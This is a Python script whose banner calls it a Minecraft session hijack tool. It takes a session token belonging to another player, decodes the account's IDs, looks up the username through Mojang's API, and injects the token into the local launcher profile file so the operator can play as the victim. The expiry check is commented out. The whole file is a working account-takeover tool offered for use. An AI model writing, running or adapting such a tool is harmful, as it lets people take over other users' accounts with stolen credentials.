import base64
import os
import re
import json
import requests
import time
import sys

from colorama import Fore, init

__version__ = '1.2.0'

# constants
APPDATA = os.getenv("APPDATA")
PATH = os.path.join(APPDATA, ".minecraft\\launcher_profiles.json")

BANNER = r"""
{0}                  w           8           
{0} 8d8b.d8b. .d8b   w .d88 .d8b 8.dP           {1}A Minecraft session hijack tool
{0} 8P Y8P Y8 8      8 8  8 8    88b            {1}written in Python 3 by {2}wodx{1}.
{0} 8   8   8 `Y8P   8 `Y88 `Y8P 8 Yb {2}v%s
{0}                wdP

 {3}www.twitter.com/wodxgod{0} - {4}www.youtube.com/wodxgod{0} - {5}www.github.com/WodXTV
    {1}""".format(Fore.LIGHTBLACK_EX, Fore.RESET, Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN) % __version__

# print functions
def print_error(message):
    print(f"[{get_time()}] {Fore.RED}[error] {Fore.RESET}{message}{Fore.RESET}")

def print_info(message):
    print(f"[{get_time()}] {Fore.BLUE}[info] {Fore.RESET}{message}{Fore.RESET}")

def print_success(message):
    print(f"[{get_time()}] {Fore.GREEN}[success] {Fore.RESET}{message}{Fore.RESET}")

# validators
def validate_token(token):
    """ validates if the given session token is valid """
    if len(token) != 308:
        return
    parts = token.split(".")
    if len(parts) != 3:
        return
    try:
        base64.b64decode(f"{parts[0]}.{parts[1]}=".encode())
    except Exception:
        return
    if not re.match(r"^[a-zA-Z0-9\-_]{43}$", parts[2]):
        return
    return True

def validate_time(epoch):
    """ validates if current time is greater than the expiration date """
    return time.time() > epoch

# getters
def get_time():
    """ returns current local time """
    return time.strftime("%H:%M:%S")

def get_name(uuid):
    """ returns username from uuid """
    try:
        data = requests.get(f"https://api.mojang.com/user/profiles/{uuid}/names").json()
        return data[len(data) - 1]["name"]
    except Exception:
        pass

def get_data(token):
    """ returns session ID, UUID and expiration date in unix epoch time format """
    data = json.loads(base64.b64decode((token.split(".")[1] + "=").encode()).decode())
    return (data["spr"], data["sub"], data["exp"])

def inject(profile):
    """ injects the new profile to the local authentication database """
    with open(PATH) as file:
        profiles = json.loads(file.read())
    profiles["authenticationDatabase"].update(profile)
    with open(PATH, "w") as file:
        file.write(json.dumps(profiles, indent=2))

def main():
    init(convert=True)

    print(BANNER)

    try:
        token = sys.argv[1]

        if not validate_token(token):
            print_error("Invalid session token")
            return

        if not os.path.exists(PATH):
            print_error(f"Failed to locate 'launcher_profiles.json'")
            return

        print_info(f"Reading token data...")
        
        uuid, sid, unix = get_data(token)

        #if not validate_time(unix):
        #    print_error(f"Session token has expired")
        #    return

        name = get_name(uuid)

        if not name:
            print_error("Failed to get username. Is your IP-address blocked?")
            return

        print_info(f"Target found: '{name}'")

        print_info(f"Injecting profile to local authentication database at: '{PATH}'...")

        profile = {sid:{"accessToken":token,"profiles":{uuid:{"displayName":name}},"properties":[],"username":name}}
        inject(profile)

        print_success("Session hijacked! You can now launch the Minecraft launcher")

        input("\nPress ENTER to exit...")

    except Exception as e:
        if isinstance(e, IndexError):
            print(f"Usage: py {sys.argv[0]} <session token>")
        else:
            print_error(f"Something went wrong: {str(e)}")

if __name__ == "__main__":
    main()